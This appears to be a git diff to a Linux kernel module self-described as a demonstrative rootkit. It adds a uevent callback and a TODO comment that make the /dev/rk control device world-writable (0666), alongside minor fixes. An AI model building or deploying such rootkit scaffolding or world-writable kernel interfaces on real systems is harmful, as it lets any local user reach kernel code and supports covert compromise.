@@ -15,7 +15,7 @@
 #define CLASS_NAME "rk"
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Tyler Riedal<riedalsolutions@gmail.com>");
+MODULE_AUTHOR("Tyler Riedal <riedalsolutions@gmail.com>");
 MODULE_DESCRIPTION("Sample rootkit implementation for demonstrative purposes.");
 
 static int major_number;
@@ -35,6 +35,7 @@ static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
 
 static struct file_operations fops =
 {
+   .owner = THIS_MODULE,
    .open = device_open,
    .read = device_read,
    .write = device_write,
@@ -61,6 +62,16 @@ static ssize_t device_write(struct file *filep, const char *buffer, size_t len, 
 
 static int device_release(struct inode *inodep, struct file *filep)
 {
+    return 0;
+}
+
+/*
+ * Set device permissions
+ * TODO: This is not working. For now run chmod 666 /dev/rk
+ */
+static int uevent(struct device *dev, struct kobj_uevent_env *env)
+{
+    add_uevent_var(env, "DEVMODE=%#o", 0666);
     return 0;
 }
 
@@ -108,6 +119,7 @@ static int __init init_mod(void)
         printk(KERN_ERR "rk: Failed to register device class.\n");
         return PTR_ERR(char_class);
     }
+    char_class->dev_uevent = uevent;
     printk(KERN_INFO "rk: Device class registered.\n");
     
     // Register device driver
